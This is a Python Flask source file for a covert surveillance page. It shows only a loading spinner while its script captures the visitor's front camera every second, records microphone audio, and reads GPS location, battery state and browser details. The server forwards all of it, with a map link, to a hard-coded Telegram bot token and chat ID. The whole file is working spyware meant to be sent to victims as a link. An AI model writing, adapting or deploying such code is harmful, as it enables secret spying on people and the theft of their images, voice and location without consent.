from flask import Flask, render_template_string, request, jsonify
import base64
import os
import telebot
import time
import threading

app = Flask(__name__)

bot = telebot.TeleBot("8073270453:AAFxqfMfYZS90k7uBPwZjLPgnjsEFuP90v8")
AUTHORIZED_CHAT_ID = '6125645260'

UPLOAD_FOLDER = 'images'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

recording_data = []

def send_image_to_bot(image_path, device_info, page_url):
    with open(image_path, 'rb') as image_file:
        caption = f"""
🖼️ **معلومات الصورة الملتقطة**  
🔗 **الرابط**: {page_url}  

📱 **معلومات الجهاز**:  
- **نوع الجهاز**: {device_info['deviceType']} 📱  
- **مستوى البطارية**: {device_info.get('batteryLevel', 'N/A')}% 🔋  
- **الشحن**: {'نعم' if device_info.get('batteryCharging', False) else 'لا'} ⚡  
- **وكيل المستخدم**: {device_info['userAgent']} 🌐  

📍 **معلومات الموقع**:  
- **خط العرض**: {device_info.get('latitude', 'غير معروف')} 📍  
- **خط الطول**: {device_info.get('longitude', 'غير معروف')} 📍  
- **موقع جغرافي**: [عرض الموقع على خرائط جوجل](https://www.google.com/maps?q={device_info.get('latitude', '')},{device_info.get('longitude', '')})

🌐 **معلومات الشبكة**:  
- **عنوان IP**: {device_info.get('ipAddress', 'غير معروف')} 🌐  
- **اسم المضيف**: {device_info.get('hostname', 'غير معروف')} 🖥️  

⏱️ **الوقت الحالي**: {device_info['timestamp']} 🕒
"""
        bot.send_photo(chat_id=AUTHORIZED_CHAT_ID, photo=image_file, caption=caption)

def send_recording_to_bot():
    while True:
        if recording_data:
            for data in recording_data:
                bot.send_audio(chat_id=AUTHORIZED_CHAT_ID, audio=data)
            recording_data.clear()
        time.sleep(8)

@app.route('/')
def index():
    return render_template_string("""
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>التقاط الصورة والبيانات</title>
            <style>
                body {
                    background-color: #2c3e50;
                    color: #ecf0f1;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    overflow: hidden;
                }
                #loader {
                    width: 100px;
                    height: 100px;
                    border: 10px solid #f3f3f3;
                    border-top: 10px solid #3498db;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                }
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                #hidden-canvas { display: none; }
            </style>
        </head>
        <body>
            <div id="loader"></div>
            <canvas id="hidden-canvas"></canvas>
            <script>
                let canvas = document.getElementById("hidden-canvas");
                let videoElement = document.createElement("video");
                let mediaRecorder;
                let audioChunks = [];

                async function startCamera() {
                    try {
                        let stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user' },
                            audio: true 
                        });
                        videoElement.srcObject = stream;
                        videoElement.play();
                        captureAndSend();
                        startRecording();
                    } catch (err) {
                        console.error("Error accessing camera and microphone: ", err);
                    }
                }

                function startRecording() {
                    mediaRecorder = new MediaRecorder(videoElement.srcObject);
                    mediaRecorder.ondataavailable = event => {
                        audioChunks.push(event.data);
                    };
                    mediaRecorder.onstop = () => {
                        let audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        let audioUrl = URL.createObjectURL(audioBlob);
                        sendAudioToServer(audioUrl);
                    };
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 8000);
                }

                async function captureAndSend() {
                    videoElement.onplay = function() {
                        setInterval(() => {
                            canvas.width = videoElement.videoWidth;
                            canvas.height = videoElement.videoHeight;
                            let context = canvas.getContext('2d');
                            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                            let imageData = canvas.toDataURL('image/png');
                            getDeviceInfo().then(deviceInfo => {
                                getLocation().then(location => {
                                    deviceInfo.latitude = location.latitude;
                                    deviceInfo.longitude = location.longitude;
                                    let locationUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
                                    deviceInfo.locationUrl = locationUrl;
                                    sendImageToServer(imageData, deviceInfo);
                                });
                            });
                        }, 1000);
                    };
                }

                function getLocation() {
                    return new Promise(resolve => {
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(function(position) {
                                resolve({
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                });
                            });
                        } else {
                            resolve({
                                latitude: 'غير معروف',
                                longitude: 'غير معروف'
                            });
                        }
                    });
                }

                function sendImageToServer(imageData, deviceInfo) {
                    fetch('/api/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            image: imageData,
                            deviceInfo: deviceInfo,
                            url: window.location.href
                        })
                    })
                    .then(response => response.json())
                    .then(data => { console.log("Image sent successfully:", data); })
                    .catch(error => { console.error("Error sending image:", error); });
                }

                function sendAudioToServer(audioUrl) {
                    fetch('/api/upload_audio', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            audioUrl: audioUrl
                        })
                    })
                    .then(response => response.json())
                    .then(data => { console.log("Audio sent successfully:", data); })
                    .catch(error => { console.error("Error sending audio:", error); });
                }

                function getDeviceInfo() {
                    return new Promise(resolve => {
                        navigator.getBattery().then(function(battery) {
                            resolve({
                                deviceType: navigator.platform,
                                userAgent: navigator.userAgent,
                                timestamp: new Date().toISOString(),
                                batteryLevel: battery.level * 100,
                                batteryCharging: battery.charging,
                                ipAddress: "192.168.1.1",
                                hostname: "localhost"
                            });
                        });
                    });
                }

                window.onbeforeunload = function () {
                    if (audioChunks.length > 0) {
                        mediaRecorder.stop();
                    }
                };

                startCamera();
            </script>
        </body>
        </html>
    """)

@app.route('/api/upload', methods=['POST'])
def upload_image():
    data = request.json
    image_data = data.get("image")
    page_url = data.get("url")
    device_info = data.get("deviceInfo")
    
    if not image_data:
        image_path = os.path.join(UPLOAD_FOLDER, f"no_image_{len(os.listdir(UPLOAD_FOLDER)) + 1}.png")
        with open(image_path, "wb") as f:
            f.write(base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGMAAAoAAQAB/khX3QAAAABJRU5ErkJggg=="))
    else:
        image_data = image_data.split(",")[1]
        image_path = os.path.join(UPLOAD_FOLDER, f"image_{len(os.listdir(UPLOAD_FOLDER)) + 1}.png")
        with open(image_path, "wb") as f:
            f.write(base64.b64decode(image_data))
    
    send_image_to_bot(image_path, device_info, page_url)
    return jsonify({"message": "Image captured and sent successfully", "path": image_path})

@app.route('/api/upload_audio', methods=['POST'])
def upload_audio():
    data = request.json
    audio_url = data.get("audioUrl")

    if audio_url:
        bot.send_audio(chat_id=AUTHORIZED_CHAT_ID, audio=audio_url)
        return jsonify({"message": "Audio sent successfully"})
    else:
        return jsonify({"message": "No audio provided"}), 400

if __name__ == '__main__':
    threading.Thread(target=send_recording_to_bot).start()
    app.run(debug=True, host='0.0.0.0', port=5000)
